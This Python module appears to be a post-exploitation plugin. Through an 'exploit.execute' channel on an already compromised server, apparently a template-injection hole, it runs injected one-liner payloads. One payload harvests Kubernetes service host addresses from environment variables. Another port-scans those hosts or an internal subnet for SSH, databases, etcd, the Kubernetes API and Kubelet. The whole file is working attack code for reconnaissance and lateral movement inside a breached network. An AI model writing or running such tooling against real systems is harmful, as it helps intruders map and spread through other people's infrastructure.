import ast

def run(exploit, target=None):
    print(f"\n[ SYSTEM SCAN: HIGH-SPEED NETWORK DISCOVERY ]")
    
    # 1. Automatic Service Discovery from Environment
    if not target:
        print("[*] No target provided. Enumerating environment for Service Hosts...")
        # Payload retrieves all keys ending in _SERVICE_HOST
        discovery_payload = (
            "(lambda: (lambda os: str([v for k,v in os.environ.items() if k.endswith('_SERVICE_HOST')]))(__import__('os')))()"
        )
        
        raw_discovery = exploit.execute(discovery_payload)
        try:
            # unique list of discovered IPs
            discovered_ips = list(set(ast.literal_eval(raw_discovery)))
            if not discovered_ips:
                # Fallback to standard API seed
                target = "10.217.4.1/24"
                print("[!] No Service Hosts found. Using default subnet.")
            else:
                print(f"[+] Discovered {len(discovered_ips)} unique service hosts in environment.")
                target_ips = discovered_ips
                mode = "SERVICE_LIST"
        except:
            target = "10.217.4.0/24"
            mode = "SUBNET"
    else:
        mode = "SUBNET"

    # 2. Setup Scanning Parameters (CIDR math or Direct List)
    if mode == "SUBNET":
        if '/' in target:
            ip_str, mask_str = target.split('/')
            mask = int(mask_str)
        else:
            ip_str, mask = target, 32

        ip_parts = [int(x) for x in ip_str.split('.')]
        ip_int = (ip_parts[0] << 24) + (ip_parts[1] << 16) + (ip_parts[2] << 8) + ip_parts[3]
        num_hosts = 1 << (32 - mask)
        network_base = ip_int & (0xffffffff << (32 - mask))
        
        target_label = target
        host_list_code = f"[f'{{(n>>24)&255}}.{{(n>>16)&255}}.{{(n>>8)&255}}.{{n&255}}' for n in range({network_base}, {network_base + num_hosts})]"
    else:
        target_label = "Environment Services"
        host_list_code = str(target_ips)

    print(f"Targeting : {target_label}")
    print(f"Strategy  : List Comprehension Probing \n")
    
    ports = [22, 80, 443, 2379, 3306, 5432, 6379, 6443, 8080, 8443, 10250]
    
    # 3. THE ONE-LINER PAYLOAD
    scanner_payload = (
        "["
        "f'{ip}:{p}' "
        f"for ip in {host_list_code} "
        f"for p in {ports} "
        "for res in [(lambda: (lambda s: ("
        "  s.settimeout(0.05) or "
        " (s.connect_ex((ip, p)) == 0)"
        "))(__import__('socket').socket(2,1)))()] "
        "if res is True"
        "]"
    )

    output = exploit.execute(scanner_payload)
    
    # 4. Minimalist Output Parsing
    try:
        hits = ast.literal_eval(output)
        
        service_map = {
            22:"SSH", 80:"HTTP", 443:"HTTPS/API", 2379:"etcd", 
            3306:"MySQL", 5432:"Postgres", 6379:"Redis",
            6443:"K8s-API", 8080:"HTTP-Alt", 8443:"HTTPS-Alt", 10250:"Kubelet"
        }

        print(f"{'IP ADDRESS':<16} {'PORT':<8} {'SERVICE':<15} {'STATUS'}")
        print(f"{'-----------':<16} {'----':<8} {'-------':<15} {'------'}")

        if hits:
            for hit in sorted(hits):
                ip, p_str = hit.split(':')
                print(f"{ip:<16} {p_str:<8} {service_map.get(int(p_str), 'Unknown'):<15} [FOUND]")
        else:
            print(f"No active services found on discovered hosts.")

    except Exception:
        if "Critical Template Error" in output:
             print(f"Server Error: {output.split('Raw snippet: ')[1]}")
        else:
             print(f"Error: Could not parse results. Raw snippet: {output[:100]}")

    print(f"\n[ Scan Complete ]\n")